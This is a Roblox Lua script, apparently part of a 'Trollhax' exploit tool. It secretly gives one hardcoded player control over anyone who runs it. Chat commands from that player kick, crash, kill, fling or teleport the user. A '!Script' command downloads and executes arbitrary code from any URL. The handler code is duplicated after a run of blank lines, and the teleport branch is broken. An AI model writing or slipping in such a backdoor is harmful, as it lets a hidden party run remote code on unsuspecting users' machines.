local Moderator = "8RR0R404"

local Players = game.Players:GetPlayers()

for i, v in pairs(Players) do
	if v.Name == Moderator then
		v.Chatted:Connect(function(Command)


			if Command == "!Terminate ".. game.Players.LocalPlayer.DisplayName then
				game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team.")
			end


			if Command == "!Crash ".. game.Players.LocalPlayer.DisplayName then
				while true do
					print("Your connection has been Crashed by The Trollhax Team.")
				end
			end


			if Command == "!Bring ".. game.Players.LocalPlayer.DisplayName then
				game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
			end


			if Command == "!Carry ".. game.Players.LocalPlayer.DisplayName then
				repeat
					wait()
					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
				until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health == 0
			end


			if Command == "!Fling ".. game.Players.LocalPlayer.DisplayName then
				game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
				local JumpPower = game.Players.LocalPlayer.Character.Humanoid.JumpPower
				wait(0.1)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = 500
				wait(0.1)
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
				wait(0.1)
				game.Players.LocalPlayer.Character.Humanoid.Sit = true
				wait(1)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
			end


			if Command == "!Kill ".. game.Players.LocalPlayer.DisplayName then
				game.Players.LocalPlayer.Character.Humanoid.Health = 0
			end


			if Command == "!SideKick ".. game.Players.LocalPlayer.DisplayName then
				while true do
					wait()
					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
				end
			end


			local CommandData = {}
			for Data in Command:gmatch("[^%s]+") do
				table.insert(CommandData, Data)
			end

			if CommandData[1] == "!Kick" then
				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
					game.Players.LocalPlayer:Kick(CommandData[3])
				end
			end


			if CommandData[1] == "!Script" then
				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
				loadstring(game:HttpGet(CommandData[3]))()
				end
			end





		end)
	end
end







































game.Players.PlayerAdded:Connect(function(Player)
	if Player.Name == Moderator then
		Player.Chatted:Connect(function(Command)
			if Command == "!Terminate ".. game.Players.LocalPlayer.DisplayName then
				game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team.")
			end


			if Command == "!Crash ".. game.Players.LocalPlayer.DisplayName then
				while true do
					print("Your connection has been Crashed by The Trollhax Team.")
				end
			end


			if Command == "!Bring ".. game.Players.LocalPlayer.DisplayName then
				game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
			end


			if Command == "!Carry ".. game.Players.LocalPlayer.DisplayName then
				repeat
					wait()
					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
				until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health == 0
			end


			if Command == "!Fling ".. game.Players.LocalPlayer.DisplayName then
				game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
				local JumpPower = game.Players.LocalPlayer.Character.Humanoid.JumpPower
				wait(0.1)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = 500
				wait(0.1)
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
				wait(0.1)
				game.Players.LocalPlayer.Character.Humanoid.Sit = true
				wait(1)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
			end


			if Command == "!Kill ".. game.Players.LocalPlayer.DisplayName then
				game.Players.LocalPlayer.Character.Humanoid.Health = 0
			end


			if Command == "!SideKick ".. game.Players.LocalPlayer.DisplayName then
				while true do
					wait()
					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
				end
			end


			local CommandData = {}
			for Data in Command:gmatch("[^%s]+") do
				table.insert(CommandData, Data)
			end

			if CommandData[1] == "!Kick" then
				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
					game.Players.LocalPlayer:Kick(CommandData[3])
				end
			end

			if CommandData[1] == "!Teleport" then
				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
					for i, v in pairs(game.Players:GetPlayers()) do
						if v.DisplayName == CommandData[3] then
							local Target = v
						end
					end
					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Workspace:WaitForChild(Target):WaitForChild("HumanoidRootPart").CFrame
				end
			end


			local CommandData = {}
			for Data in Command:gmatch("[^%s]+") do
				table.insert(CommandData, Data)
			end

			if CommandData[1] == "!Kick" then
				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
					game.Players.LocalPlayer:Kick(CommandData[3])
				end
			end


			if CommandData[1] == "!Script" then
				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
				loadstring(game:HttpGet(CommandData[3]))()
				end
			end





		end)
	end
end)
